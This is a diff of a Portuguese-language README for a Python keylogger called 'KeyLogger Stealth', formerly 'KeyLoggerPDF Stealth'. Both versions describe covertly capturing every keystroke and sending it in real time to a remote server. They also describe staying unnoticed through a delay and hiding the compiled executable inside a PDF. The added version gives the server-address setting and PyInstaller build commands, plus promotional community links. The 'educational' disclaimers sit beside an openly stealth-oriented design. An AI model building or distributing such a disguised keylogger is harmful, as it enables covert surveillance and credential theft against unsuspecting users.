@@ -1,30 +1,63 @@
-KeyLoggerPDF Stealth é uma ferramenta avançada para infiltrar um keylogger em arquivos PDF e coletar informações de teclado em tempo real. Esta ferramenta é útil para coletar informações de usuários, criar dispositivos de segurança, ou executar ações secrecy em outros dispositivos.
+## KeyLogger Stealth
 
-Características
+### Descrição
 
-    Stealth Mode - O keylogger opera em segundo plano, sem ser percebido pelo usuário Final.
-    Fluente - Em tempo real coleta as ações no teclado e as envia para o servidor.
-    Transparente - Você pode usar arquivos PDF comuns em todos os dispositivos para coletar informações.
-    Versátil - Compatível com diferentes sistemas de operação e foi projetado para functionar em vários dispositivos, desde computadores pessoais até dispositivos móveis.
-    Configurável - Deixe as opções de seu próprio servidor que coleta as informações do keylogger.
+KeyLogger Stealth é um keylogger básico em Python projetado para capturar e registrar todas as teclas digitadas em um computador. O programa se conecta a um servidor remoto para enviar as teclas coletadas em tempo real. **Atenção: Este software é para fins educacionais e de segurança somente. O uso não autorizado é ilegal e antiético.**
 
+### Requisitos
 
-#Instalação
+- Python 3.x
+- PyInstaller
+- Acesso a um servidor remoto configurado para receber as teclas
 
-    Baixe o software em .
-    Instale as dependências Python necessárias, como "pyinstaller".
+### Configuração
 
-pip install pyinstaller
+1. **Clone o repositório ou baixe o arquivo `keylogger.py`.**
 
-    Compile o arquivo keylogger com PyInstaller:
+2. **Configuração do servidor**
 
-pyinstaller --onefile keylogger.py
+   Abra o arquivo `keylogger.py` e substitua `your_server_address` e `1234` pelo endereço IP do seu servidor e a porta que você deseja usar.
 
-    Instale o PDF-Creator e use-o para criar um novo PDF com o arquivo executável (keylogger.exe).
+   ```python
+   server_address = ('your_server_address', 1234)
+   ```
 
-Como usar
+### Uso
 
-Você pode usar o PowerPDF Stealth para executar operações sigilosas e coletar informações de teclado em vários dispositivos.
-Licença e Limitações
+1. **Instale o PyInstaller**
 
-#Nós, desenvolvedores, não fornecemos nenhuma garantia ou suporte para KeyLoggerPDF Stealth. Usar esse software é seu risco. Além disso, a utilização deste software pode ser ilegal e violar a privacidade dos usuários. Usá-lo com consciência e responsabilidade.
+   ```
+   pip install pyinstaller
+   ```
+
+2. **Compile o script Python em um arquivo executável**
+
+   ```
+   pyinstaller --onefile keylogger.py
+   ```
+
+   Isso gerará um arquivo executável (`keylogger.exe`) na pasta `dist`.
+
+3. **Incorporação do executável em um PDF**
+
+   Opcionalmente, você pode incorporar o arquivo executável em um PDF usando o PDF-Creator. **Nota: Esta etapa pode ser usada para propósitos maliciosos; proceda com ética e responsabilidade.**
+
+### Como Funciona
+
+- **Captura de Teclas:** O keylogger lê todas as teclas digitadas no sistema.
+- **Envio para Servidor:** As teclas capturadas são enviadas para o servidor remoto configurado.
+- **Atraso para Discrição:** Um pequeno atraso é introduzido para minimizar a percepção do keylogger.
+
+### Aviso Legal
+
+Este software é fornecido apenas para fins educacionais e de segurança. O autor não se responsabiliza pelo uso indevido ou ilegal deste software. Utilize-o com responsabilidade e ética, e sempre obtenha permissão explícita antes de monitorar qualquer sistema.
+
+### Autor
+
+KeyLoggerPDF foi desenvolvido para fins educacionais e para demonstrar os princípios básicos de um keylogger.
+
+### Divulgação
+
+comunidade no discord -> https://discord.gg/GGwqxPJEHJ
+
+instagram -> https://instagram.com/rootbreak_
